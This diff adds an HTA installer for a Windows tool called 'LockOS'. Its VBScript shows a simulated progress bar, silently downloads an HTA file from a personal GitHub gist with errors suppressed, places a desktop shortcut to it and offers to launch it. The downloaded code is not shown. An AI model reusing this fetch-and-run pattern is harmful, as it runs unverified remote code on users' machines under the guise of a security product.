@@ -1,0 +1,182 @@
+<html>
+<head>
+<title>Installer+</title>
+<HTA:APPLICATION
+  ID="InstallerPlus"
+  APPLICATIONNAME="InstallerPlus"
+  BORDER="dialog"
+  CAPTION="yes"
+  ICON="https://drive.google.com/uc?export=download&id=1CjTFr2TGYs009MIh3rNhvvA8U1zgO9NE"
+  MAXIMIZEBUTTON="no"
+  MINIMIZEBUTTON="no"
+  SCROLL="no"
+  SHOWINTASKBAR="yes"
+  SINGLEINSTANCE="yes"
+  SYSMENU="yes"
+  WINDOWSTATE="normal">
+<style>
+body { 
+  font-family: 'Segoe UI', sans-serif; 
+  margin:20px; 
+  background:#f0f0f0; 
+  width: 600px; 
+  height: 400px; 
+  position: relative;
+}
+h2 { margin-top:0; }
+button { 
+  padding:8px 16px; 
+  margin-top:10px; 
+  cursor:pointer; 
+}
+#progressContainer { 
+  width:100%; 
+  height:20px; 
+  background:#ccc; 
+  border-radius:4px; 
+  margin-top:10px; 
+}
+#progressBar { 
+  height:100%; 
+  width:0%; 
+  background:#4caf50; 
+  border-radius:4px; 
+}
+#progressLabel { 
+  margin-top:5px; 
+  text-align:center; 
+}
+#section { 
+  margin-top:15px; 
+}
+#poweredBy {
+  position:absolute;
+  bottom:10px;
+  width:100%;
+  text-align:center;
+  font-size:12px;
+  color:#555;
+}
+#poweredBy img { width:50px; display:block; margin:2px auto 0 auto; }
+</style>
+<script language="vbscript">
+Dim fso, shellApp, wsh, installFolder
+Dim progress, stepInterval
+
+Const GIST_URL = "https://gist.githubusercontent.com/yonteryem/12f492eb1c220185b4e93064fae9ffd2/raw/gistfile1.txt"
+Const ICO_URL  = "https://raw.githubusercontent.com/yonteryem/installer-ico-lockos/main/lockos.ico"
+Const POWERED_LOGO = "https://drive.google.com/uc?export=download&id=1Qgl1II2qE27RCHfEUtMlOk8eV7JWVrGz"
+
+Sub Window_OnLoad()
+  window.resizeTo 600, 400
+  window.moveTo (screen.width-600)/2, (screen.height-400)/2
+  Set fso = CreateObject("Scripting.FileSystemObject")
+  Set shellApp = CreateObject("Shell.Application")
+  Set wsh = CreateObject("WScript.Shell")
+  ShowIntro
+End Sub
+
+Sub ShowIntro()
+  document.body.innerHTML = "<h2>Welcome to Installer+</h2>" & _
+  "<div id='section'>LockOS secures your Windows environment.<br><br>" & _
+  "<input type='checkbox' id='agreeTOS'> I agree to the Terms of Service &copy; 2025<br>" & _
+  "<button onclick='CheckTOS'>Next</button></div>" & _
+  "<div id='poweredBy'>Powered By<br><img src='" & POWERED_LOGO & "'></div>"
+End Sub
+
+Sub CheckTOS()
+  If Not document.getElementById("agreeTOS").checked Then
+    MsgBox "You must agree to the Terms to continue."
+    Exit Sub
+  End If
+  PickFolder
+End Sub
+
+Sub PickFolder()
+  Dim folder
+  Set folder = shellApp.BrowseForFolder(0, "Choose folder to install LockOS", 0)
+  If folder Is Nothing Then Exit Sub
+  installFolder = folder.Self.Path & "\LockOS"
+  If Not fso.FolderExists(installFolder) Then fso.CreateFolder(installFolder)
+  StartInstall
+End Sub
+
+Sub StartInstall()
+  document.body.innerHTML = "<h2>Installing LockOS...</h2>" & _
+  "<div id='progressContainer'><div id='progressBar'></div></div>" & _
+  "<div id='progressLabel'>0%</div>" & _
+  "<div id='poweredBy'>Powered By<br><img src='" & POWERED_LOGO & "'></div>"
+  progress = 0
+  stepInterval = 400
+  window.setTimeout "InstallStep", stepInterval
+End Sub
+
+Sub InstallStep()
+  If progress < 95 Then
+    progress = progress + Int(Rnd*10 + 5)
+    If progress > 95 Then progress = 95
+    document.getElementById("progressBar").style.width = progress & "%"
+    document.getElementById("progressLabel").innerText = progress & "%"
+    window.setTimeout "InstallStep", stepInterval
+  Else
+    InstallFiles
+  End If
+End Sub
+
+Sub InstallFiles()
+  Dim targetPath, iconPath
+  targetPath = installFolder & "\LockOS.hta"
+  iconPath = installFolder & "\LockOS.ico"
+
+  ' Download ICO first (silent, no error message)
+  DownloadFile ICO_URL, iconPath
+
+  ' Then download HTA
+  DownloadFile GIST_URL, targetPath
+
+  ' Create desktop shortcut with applied ICO
+  Dim shortcut
+  Set shortcut = wsh.CreateShortcut(wsh.SpecialFolders("Desktop") & "\LockOS.lnk")
+  shortcut.TargetPath = targetPath
+  shortcut.IconLocation = iconPath
+  shortcut.WorkingDirectory = installFolder
+  shortcut.Save
+
+  progress = 100
+  document.getElementById("progressBar").style.width = "100%"
+  document.getElementById("progressLabel").innerText = "100%"
+  ShowFinish
+End Sub
+
+Sub DownloadFile(url, path)
+  On Error Resume Next
+  Dim xhr, stream
+  Set xhr = CreateObject("MSXML2.XMLHTTP")
+  xhr.Open "GET", url, False
+  xhr.Send
+  If xhr.Status = 200 Then
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1
+    stream.Open
+    stream.Write xhr.ResponseBody
+    stream.SaveToFile path, 2
+    stream.Close
+  End If
+End Sub
+
+Sub ShowFinish()
+  document.body.innerHTML = "<h2>Installation Complete</h2>" & _
+  "<div id='section'>LockOS has been installed successfully.<br>" & _
+  "<p style='font-size:10px;'>Thanks for using Installer+</p>" & _
+  "<button onclick='RunApp'>Launch LockOS</button></div>" & _
+  "<div id='poweredBy'>Powered By<br><img src='" & POWERED_LOGO & "'></div>"
+End Sub
+
+Sub RunApp()
+  wsh.Run """" & installFolder & "\LockOS.hta""", 1, False
+End Sub
+</script>
+</head>
+<body>
+</body>
+</html>
